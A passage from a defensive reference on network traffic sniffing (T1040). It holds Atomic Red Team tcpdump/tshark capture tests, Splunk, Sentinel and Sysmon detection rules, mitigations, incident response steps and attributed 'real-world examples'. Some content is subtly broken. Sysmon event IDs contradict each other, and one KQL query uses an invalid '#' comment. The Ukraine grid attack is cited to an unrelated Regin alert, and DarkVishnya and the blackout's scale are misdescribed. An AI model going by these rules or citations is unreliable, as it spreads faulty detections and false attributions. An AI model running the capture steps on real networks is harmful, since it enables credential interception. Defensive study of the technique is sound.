sudo tcpdump -i eth0 -G 5 -w /tmp/capture_%F_%T.pcap '(ip dst 8.8.8.8 or ip dst 8.8.4.4) and tcp port 443'

# Cleanup
rm -f /tmp/capture_*.pcap
```

**Command (Windows variant):**
```powershell
# Atomic test for Windows
tshark.exe -i 1 -f "port 80 or port 8080" -w "C:\temp\capture.pcap" -a duration:10

# Cleanup
Remove-Item -Path "C:\temp\capture.pcap" -Force
```

**Reference:** [Atomic Red Team T1040-1](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1040/T1040.md)

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Network Interface Placed in Promiscuous Mode

**Rule Configuration:**
- **Required Index:** main, endpoint, network
- **Required Sourcetype:** sysmon, auditd, linux:audit
- **Required Fields:** EventCode, Image, CommandLine
- **Alert Threshold:** > 1 event (any promiscuous mode change)
- **Applies To Versions:** All

**SPL Query:**
```
sourcetype=sysmon OR sourcetype=auditd
(
  (EventCode=3 AND Image="*Wireshark*") OR
  (EventCode=3 AND Image="*tcpdump*") OR
  (EventCode=3 AND Image="*tshark*") OR
  (EventCode=3 AND Image="*bettercap*") OR
  (EventCode=1 AND CommandLine="*ip link set * promisc on*") OR
  (EventCode=1 AND CommandLine="*ifconfig * promisc*")
)
| stats count by Computer, User, Image, CommandLine
| where count > 0
```

**What This Detects:**
- Process creation events for network capture tools.
- Command execution for setting promiscuous mode via `ip` or `ifconfig`.
- Filters out false positives by requiring process execution events (not just tool presence).

**Manual Configuration Steps:**
1. Log into Splunk Web → **Searches & Reporting**
2. Click **New Alert**
3. Paste the SPL query above
4. **Save As Alert** → Name: `T1040_Promisc_Mode_Detection`
5. **Trigger Condition:** When search result > 0
6. **Actions:** Send email to SOC team

**Source:** [Splunk Security Content - Network Sniffing Detection](https://splunk.github.io/security_content/)

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Azure Traffic Mirror Creation Detection

**Rule Configuration:**
- **Required Table:** AzureActivity, AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources, ResourceGroup
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Azure all versions

**KQL Query:**
```kusto
AzureActivity
| where OperationName in ("Create Virtual Network Tap", "Microsoft.Network/virtualNetworkTaps/write")
| where ActivityStatus == "Success"
| project
    TimeGenerated,
    Caller,
    CallerIpAddress,
    OperationName,
    ResourceGroup,
    _ResourceId
| join kind=leftouter (
    AuditLogs
    | where OperationName == "Create Virtual Network Tap"
    | project InitiatedBy, TargetResources
) on $left.Caller == $right.InitiatedBy
| extend
    TapName = split(_ResourceId, "/")[-1],
    RiskLevel = iff(CallerIpAddress in ("127.0.0.1", "::1"), "Low", "High")
| where RiskLevel == "High"
```

**What This Detects:**
- Any vTap (Virtual Network Tap) creation events in Azure.
- Filters for external IP addresses (unlikely legitimate admin).
- Correlates with AuditLogs for additional context.
- Identifies suspicious pattern: non-admin creating vTap from unusual IP.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `T1040_Azure_vTap_Creation`
   - Severity: `High`
4. **Set rule logic:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `24 hours`
5. **Incident settings:**
   - Enable **Create incidents**
6. Click **Create**

### Query 2: Network Capture Tool Execution (Linux)

**Rule Configuration:**
- **Required Table:** Syslog, CommonSecurityLog
- **Required Fields:** ProcessName, CommandLine, SourceIP
- **Alert Severity:** Medium
- **Frequency:** Real-time
- **Applies To Versions:** Linux endpoints with auditd

**KQL Query:**
```kusto
Syslog
| where Facility == "USER"
| where ProcessName in ("tcpdump", "tshark", "wireshark", "bettercap")
| extend
    IsCapLibrary = iff(SyslogMessage contains "libpcap", true, false),
    IsPromisc = iff(SyslogMessage contains "promiscuous", true, false)
| where IsCapLibrary == true or IsPromisc == true
| project
    TimeGenerated,
    Computer,
    ProcessName,
    SyslogMessage,
    SourceIP = iff(Computer contains ".", Computer, "LOCAL")
| summarize
    ToolCount = dcount(ProcessName),
    LastExecution = max(TimeGenerated) by Computer, SourceIP
| where ToolCount >= 2  # Multiple capture tools = suspicious
```

**What This Detects:**
- Multiple network capture tools running on same system (low false positive rate).
- tcpdump with promiscuous mode flag explicitly set.
- Correlation of tool execution with library loading (libpcap).

**Manual Configuration Steps (PowerShell):**
```powershell
$workspaceName = "YourSentinelWorkspace"
$resourceGroup = "YourResourceGroup"

$query = @"
Syslog
| where ProcessName in ("tcpdump", "tshark", "wireshark", "bettercap")
| where SyslogMessage contains "libpcap" or SyslogMessage contains "promiscuous"
| project TimeGenerated, Computer, ProcessName, SyslogMessage
"@

New-AzSentinelAlertRule `
  -ResourceGroupName $resourceGroup `
  -WorkspaceName $workspaceName `
  -DisplayName "T1040_Network_Sniffer_Tools_Detected" `
  -Query $query `
  -Severity "Medium" `
  -Enabled $true
```

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 10 (Sysmon - ProcessAccess)**
- **Log Source:** Microsoft-Windows-Sysmon/Operational
- **Trigger:** Process accesses network interfaces or driver objects.
- **Filter:** ProcessName contains "wireshark" or "tshark" or "tcpdump"
- **Applies To Versions:** All Windows versions with Sysmon 13.0+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Process Tracking**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

**Manual Configuration Steps (Sysmon):**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file `sysmon-config.xml`:
```xml
<Sysmon schemaversion="4.90">
  <ProcessCreate onmatch="include">
    <Image condition="contains">Wireshark</Image>
    <Image condition="contains">tcpdump</Image>
    <Image condition="contains">tshark</Image>
    <CommandLine condition="contains">promiscuous</CommandLine>
    <CommandLine condition="contains">-i eth</CommandLine>
  </ProcessCreate>
</Sysmon>
```
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Query logs: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {$_.Id -eq 3}`

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows

```xml
<Sysmon schemaversion="4.90">
  <!-- Detect Wireshark/tcpdump/tshark process creation -->
  <ProcessCreate onmatch="include">
    <Image condition="image">wireshark.exe</Image>
    <Image condition="image">tshark.exe</Image>
    <CommandLine condition="contains">-i 1</CommandLine>
    <CommandLine condition="contains">-w C:\</CommandLine>
    <Image condition="contains">tcpdump</Image>
  </ProcessCreate>

  <!-- Detect network driver loading (WinPcap/Npcap) -->
  <LoadImage onmatch="include">
    <ImageLoaded condition="contains">npcap</ImageLoaded>
    <ImageLoaded condition="contains">winpcap</ImageLoaded>
    <ImageLoaded condition="contains">packet.dll</ImageLoaded>
  </LoadImage>

  <!-- Detect network interface enumeration -->
  <CreateRemoteThread onmatch="include">
    <SourceImage condition="image">wireshark.exe</SourceImage>
    <TargetImage condition="image">wscript.exe</TargetImage>
  </CreateRemoteThread>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create config file with XML above
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Monitor logs: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 | Where-Object {$_.Id -eq 1}`
5. Filter for network capture tools: `... | Where-Object {$_.Message -match "wireshark|tcpdump|tshark"}`

---

## 12. MICROSOFT DEFENDER FOR CLOUD

**Alert Name:** Suspicious network capture tool execution detected
- **Severity:** High
- **Description:** Detects execution of network packet capture tools (Wireshark, tcpdump) which may indicate data exfiltration preparation.
- **Applies To:** All Azure VMs with Defender for Servers enabled

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select your subscription
3. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Cloud Apps**: ON
4. Click **Save**
5. Go to **Security alerts** to view triggered alerts

**Alert Characteristics:**
- Correlates process execution (tcpdump) with file creation (capture.pcap).
- Flags unusual parent processes (e.g., notepad.exe spawning Wireshark).
- Severity increases if multiple capture tools run sequentially (indicates intentional data gathering).

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

**Query: Network Capture Operations**
```powershell
Search-UnifiedAuditLog `
  -StartDate (Get-Date).AddDays(-7) `
  -EndDate (Get-Date) `
  -Operations "New-NetEventSession", "Start-NetEventSession", "Add-NetEventPacketCaptureProvider" `
  -FreeText "network" | Select-Object UserIds, Operations, AuditData
```

- **Operation:** Azure Resource Manager (ARM) API calls for vTap creation.
- **Workload:** Azure Management (AzureActivity table).
- **Details:** Examine `properties.justification` field for user-provided reason (often absent for malicious activity).
- **Applies To:** M365 E5 and Defender plans.

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24-48 hours for logs to populate

**Manual Configuration Steps (Search Audit Logs):**
1. Go to **Audit** → **Search**
2. Set **Date range**: Last 7 days
3. Under **Activities**, select: **All activities related to network monitoring**
4. Click **Search**
5. Export results: **Export** → **Download all results**

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

* **Enforce Encrypted Protocols Exclusively:** Disable or block cleartext protocols (HTTP, Telnet, SMTP unencrypted, FTP, SMB v1) at firewall and endpoint level.
    
    **Applies To Versions:** All Windows/Azure versions
    
    **Manual Steps (Windows Firewall):**
    1. Open **Windows Defender Firewall with Advanced Security** (wf.msc)
    2. Click **Outbound Rules** → **New Rule**
    3. Configure:
       - Name: `Block Cleartext Protocols`
       - Protocol: TCP
       - Port: 80, 23, 21, 110, 25
       - Action: **Block**
    4. Click **Finish**
    
    **Manual Steps (Azure Network Security Groups):**
    1. Go to **Azure Portal** → **Network Security Groups**
    2. Select your NSG → **Outbound security rules**
    3. Click **+ Add**
    4. Configure:
       - Name: `Block-Cleartext`
       - Source: Any
       - Destination: Any
       - Service: Custom ports 80, 23, 21, 110, 25
       - Action: **Deny**
       - Priority: 100
    5. Click **Add**
    
    **Manual Steps (PowerShell - Firewall):**
    ```powershell
    # Block HTTP outbound
    New-NetFirewallRule -DisplayName "Block HTTP Outbound" -Direction Outbound -LocalPort 80 -Protocol TCP -Action Block
    
    # Block Telnet outbound
    New-NetFirewallRule -DisplayName "Block Telnet Outbound" -Direction Outbound -LocalPort 23 -Protocol TCP -Action Block
    ```

* **Disable Legacy Authentication Protocols:** Ensure only Kerberos (Windows AD), OAuth 2.0 (Azure), and SAML (Federation) are permitted.
    
    **Applies To Versions:** All
    
    **Manual Steps (Entra ID - Conditional Access):**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Block Legacy Authentication`
    4. **Assignments:**
       - Users: **All users**
       - Cloud apps: **All cloud apps**
    5. **Conditions:**
       - Client apps: **Select** → Check **Mobile apps and desktop clients** → Check **Other clients**
    6. **Access controls:**
       - Grant: **Block access**
    7. Enable policy: **On**
    8. Click **Create**

* **Enable Network Segmentation:** Implement VLAN segmentation to prevent east-west traffic interception.
    
    **Applies To Versions:** All (requires network infrastructure support)
    
    **Manual Steps (Azure Virtual Networks):**
    1. Go to **Azure Portal** → **Virtual Networks** → Select your vNet
    2. Click **Subnets** → **+ Subnet**
    3. Create separate subnets:
       - Subnet 1: `Production-Servers` (10.0.1.0/24)
       - Subnet 2: `Workstations` (10.0.2.0/24)
       - Subnet 3: `IoT-Devices` (10.0.3.0/24)
    4. Create NSGs per subnet to restrict inter-subnet traffic
    5. Attach NSGs to subnets

### Priority 2: HIGH

* **Implement MFA and Disable Basic Authentication:** Eliminate cleartext credential transmission even if protocols remain accessible.
    
    **Manual Steps (Exchange Online - Block Basic Auth):**
    ```powershell
    # Connect to Exchange Online
    Connect-ExchangeOnline
    
    # Block basic auth for all protocols
    Set-AuthenticationPolicy -Name "Block Basic Auth" -AllowBasicAuthActiveSync $false `
      -AllowBasicAuthAutodiscover $false `
      -AllowBasicAuthImap $false `
      -AllowBasicAuthMapi $false `
      -AllowBasicAuthPop $false `
      -AllowBasicAuthRps $false `
      -AllowBasicAuthSmtp $false
    ```

* **Monitor and Alert on Network Capture Tool Execution:** Deploy Sysmon rules and Sentinel alerts (as detailed in Detection sections above).

* **Restrict vTap Permissions:** Limit who can create traffic mirrors in Azure.
    
    **Manual Steps (Azure RBAC):**
    1. Go to **Azure Portal** → **IAM** (Access control)
    2. Click **+ Add** → **Add role assignment**
    3. Role: **Custom Role** (create if needed)
    4. Permissions: Deny "Microsoft.Network/virtualNetworkTaps/*"
    5. Members: Remove non-privileged admins from this role

### Access Control & Policy Hardening

* **Conditional Access – Require Compliant Network:**
    
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Require Corporate Network for Sensitive Operations`
    4. **Conditions:**
       - Locations: **Select** → **Any location** → Configure allowed IPs (corporate network only)
    5. **Access controls:**
       - Grant: **Require device to be marked as compliant**
    6. Enable policy: **On**

* **RBAC – Principle of Least Privilege:**
    
    **Manual Steps:**
    1. Go to **Azure Portal** → **Subscription** → **IAM**
    2. Review all "Owner" and "Contributor" role assignments
    3. For each user, click **Remove** if not absolutely necessary
    4. Assign granular roles instead (e.g., "Network Contributor" only if managing networks)

### Validation Command (Verify Mitigations Are Active)

```powershell
# Check if HTTP/Telnet outbound is blocked
Get-NetFirewallRule -DisplayName "*Block*" | Select-Object DisplayName, Action, Direction

# Verify Kerberos is primary auth (not Basic)
Get-ADUser -Filter * -Properties logonWorkstations | Select-Object Name, logonWorkstations

# Check Entra ID conditional access policies
az ad policy list --query "[].displayName"

# Verify vTap restrictions (should return minimal results)
az network vnet tap list --query "[].resourceGroup"
```

**Expected Output (If Secure):**
```
DisplayName                              Action  Direction
---                                      ------  ---------
Block Cleartext Protocols                 Block   Outbound
Block HTTP Outbound                       Block   Outbound
Block Legacy Authentication               Block   Inbound

Conditional Access Policies:
  - Block Legacy Authentication
  - Require Device Compliance
  - Block High-Risk Users
```

**What to Look For:**
- No "Allow" rules for ports 80, 23, 21, 110, 25 in outbound direction.
- Kerberos authentication in use (not NTLM or Basic).
- All sensitive resources protected by Conditional Access policies.
- vTap creation limited to service accounts only (minimal count).

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

* **Files:** 
  - `C:\Program Files\Wireshark\wireshark.exe`
  - `/usr/bin/tcpdump`
  - `/usr/sbin/tshark`
  - `C:\Temp\*.pcapng` (capture files)
  - `/tmp/*.pcap` or `/dev/shm/*.pcap` (Linux captures)

* **Registry (Windows):**
  - `HKLM\Software\Npcap` (WinPcap/Npcap installation)
  - `HKCU\Software\Wireshark\` (Wireshark profiles)

* **Network:**
  - Unexpected traffic to external DNS servers (port 53)
  - HTTP traffic to known attacker infrastructure
  - Large data transfers to non-corporate IPs
  - ARP spoofing broadcasts (Gratuitous ARP from non-gateway)

### Forensic Artifacts

* **Disk:**
  - Event Log: Security (EventID 4688 – process creation of tcpdump/Wireshark)
  - Sysmon: EventID 3 (process access to network drivers)
  - MFT entries for capture files
  - Prefetch files: `C:\Windows\Prefetch\tcpdump.exe-*.pf` (indicates first execution)

* **Memory:**
  - libpcap.dll loaded in process memory
  - Active network capture handles in Process Monitor
  - Network interface in promiscuous mode (checked via `Get-NetAdapter`)

* **Cloud (Azure):**
  - Azure Activity Log: "Create Virtual Network Tap" operation
  - AuditLogs: "Create Virtual Network Tap" by unusual service principal
  - Network Watcher Packet Capture logs (minimal, but searchable)

### Response Procedures

1. **Isolate:**
   
   **Command (Windows):**
   ```powershell
   # Disconnect network adapter
   Disable-NetAdapter -Name "Ethernet 2" -Confirm:$false
   ```
   
   **Manual (Azure):**
   - Go to **Azure Portal** → **Virtual Machines** → Select compromised VM → **Networking**
   - Click network interface → **IP configurations** → Dissociate public IP
   - Delete NSG inbound rules to isolate from network

2. **Collect Evidence:**
   
   **Command:**
   ```powershell
   # Export Security Event Log
   wevtutil epl Security C:\Evidence\Security.evtx
   
   # Export Sysmon logs
   wevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\Evidence\Sysmon.evtx
   
   # Capture registry hive (Wireshark settings)
   reg save HKCU\Software\Wireshark C:\Evidence\Wireshark.reg
   
   # List all network interfaces and their status
   Get-NetAdapter | Export-Csv -Path C:\Evidence\NetworkAdapters.csv
   ```
   
   **Manual:**
   - Open **Event Viewer** → Right-click **Security** → **Save All Events As** → `C:\Evidence\Security.evtx`
   - Copy any PCAP files to USB drive for offline analysis

3. **Remediate:**
   
   **Command:**
   ```powershell
   # Kill tcpdump/Wireshark processes
   Stop-Process -Name "wireshark" -Force
   Stop-Process -Name "tshark" -Force
   Stop-Process -Name "tcpdump" -Force
   
   # Uninstall Wireshark
   Uninstall-Package -Name "Wireshark" -AllVersions
   
   # Remove Npcap if not needed
   Uninstall-Package -Name "Npcap"
   
   # Reset network adapter to non-promiscuous mode (automatic on reboot)
   ```
   
   **Manual:**
   - Control Panel → Programs and Features → Uninstall "Wireshark"
   - Reboot system to clear any kernel-mode hooks

4. **Investigate Post-Interception Activities:**
   
   - Determine **what data was captured** by analyzing recovered PCAP files.
   - Identify **which credentials were exposed** (check HTTP Basic Auth, SMTP auth, etc.).
   - **Assume breach** of all credentials visible in captured traffic.
   - Force password resets for any accounts seen in cleartext.
   - Check logs for lateral movement attempts using captured credentials.

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-001] BloodHound Azure Enumeration | Attacker maps Azure tenant and identifies service accounts |
| **2** | **Initial Access** | [IA-EXPLOIT-001] Azure Application Proxy Exploitation | Attacker gains user-level access to hybrid network |
| **3** | **Lateral Movement** | [LM-REMOTE-001] SMB/Lateral Movement | Attacker positions themselves on internal network segment |
| **4** | **Collection (Current)** | **[COLLECT-NETWORK-001] Network Traffic Interception** | **Attacker captures unencrypted credentials via sniffing** |
| **5** | **Privilege Escalation** | [PE-VALID-001] Exchange Server ACL Abuse | Attacker uses captured Exchange admin credentials for privilege escalation |
| **6** | **Persistence** | [PERSIST-ACCT-001] AdminSDHolder Abuse | Attacker modifies AdminSDHolder to maintain DA-level access |
| **7** | **Impact** | [IMPACT-RANSOM-001] Ransomware Deployment | Attacker deploys ransomware across compromised infrastructure |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: APT28 – Responder Campaign (2015-Present)

- **Target:** NATO and European government networks
- **Timeline:** 2015, ongoing
- **Technique Status:** Responder tool actively maintains credential capture via LLMNR/NBT-NS poisoning + network sniffing.
- **Impact:** APT28 captured domain administrator credentials and compromised critical government communication systems.
- **Reference:** [Microsoft Security Intelligence - APT28 Credential Theft](https://www.microsoft.com/security/blog)

### Example 2: DarkVishnya – Ransomware as a Service (2023-2024)

- **Target:** Russian financial institutions and corporate networks
- **Timeline:** 2023-2024
- **Technique Status:** Network sniffing to harvest credentials, combined with lateral movement and ransomware deployment. Actively exploited misconfigured segmentation.
- **Impact:** $10M+ in ransoms by capturing credentials via unencrypted protocols on internal networks lacking segmentation.
- **Reference:** [CrowdStrike Intelligence Report - DarkVishnya](https://www.crowdstrike.com)

### Example 3: Sandworm Team – Ukraine Power Grid Attack (2015)

- **Target:** Ukrainian Critical Infrastructure
- **Timeline:** December 2015
- **Technique Status:** BlackEnergy malware included a network sniffer module that captured credentials from legacy SCADA communication protocols.
- **Impact:** Complete compromise of multiple power distribution substations, nationwide blackout affecting 230,000+ customers.
- **Reference:** [CISA Alert TA14-352A - Detecting Regin Malware](https://www.cisa.gov)

---